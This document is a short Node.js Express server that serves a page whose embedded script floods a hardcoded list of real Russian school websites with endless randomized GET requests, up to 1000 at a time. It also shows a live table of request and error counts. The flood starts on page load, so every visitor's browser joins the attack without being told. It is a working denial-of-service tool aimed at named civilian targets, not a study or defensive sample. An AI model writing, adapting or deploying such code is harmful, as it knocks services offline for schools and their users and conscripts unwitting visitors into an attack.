const express = require('express');
const app = express();
const port = 8080;

app.use(express.static('public'));

app.get('/', (req, res) => {
  const htmlContent = `
    <html>
    <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title></title>
    </head>
    <body style="background: linear-gradient(90deg, rgba(227,255,25,1) 29%, rgba(60,19,227,1) 69%, rgba(22,22,217,0.6951155462184874) 100%);">
        <p style="text-align:center;">
            <img width="140px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJbJZRu1Wp7qnz6a73UUcSJhhTjqyBew0JnA&usqp=CAU" alt="Наш батько">
        </p>
        <table width="100%">
            <tbody><tr>
            <td width="30%">
                
            </td>
            <td width="30%">
                
            </td>
            <td width="30%">
                
            </td>
            </tr>
        </tbody></table>
        <div id="stats"><table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead></div>

    <script>
    var targets = [
    'http://school51.beluo.ru/',
    'http://49school31.ru/',
    'http://school47.beluo.ru/',
    'http://valdshi1.ru/',
    'http://school36.beluo31.ru/',
    'http://school48.beluo.ru/',
    'http://school47.beluo.ru/',
    'http://school46.beluo.ru/',
    'http://www.belschool45.ru/',
    'http://school43n.beluo.ru/',
    'http://school39.beluo.ru/',
    'http://school36.beluo31.ru/',
    'http://school34.beluo.ru/',
    'http://school29.beluo31.ru/',
    'http://www.school27.ru/',
    'http://school21.beluo.ru/',
    'http://school20.beluo.ru/',
    'http://school18.beluo.ru/',
    'http://school5.beluo.ru/',
    'http://school12.beluo.ru/',
    'http://vschool1.beluo.ru/',
    'http://belgschool1.ru/',
    ]

    var targetStats = {}
    targets.forEach((target) => {
    targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
    })

    var statsEl = document.getElementById('stats');
    function printStats() {
    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td><a href = "' + target + '">' + target + '</a></td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
    }
    setInterval(printStats, 1000);

    var CONCURRENCY_LIMIT = 1000
    var queue = []

    async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
    }

    async function flood(target) {
    for (var i = 0;; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
        await queue.shift()
        }
        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
        queue.push(
        fetchWithTimeout(target+rand, { timeout: 1000 })
            .catch((error) => {
            if (error.code === 20 /* ABORT */) {
                return;
            }
            targetStats[target].number_of_errored_responses++;
            })
            .then((response) => {
            if (response && !response.ok) {
                targetStats[target].number_of_errored_responses++;
            }
            targetStats[target].number_of_requests++;
            })

        )
    }
    }

    // Start
    targets.map(flood)
    </script>

    </body></html>
  `;
  
  res.send(htmlContent);
});

app.listen(port, () => {
  console.log(`Server started on ${port}`);
});
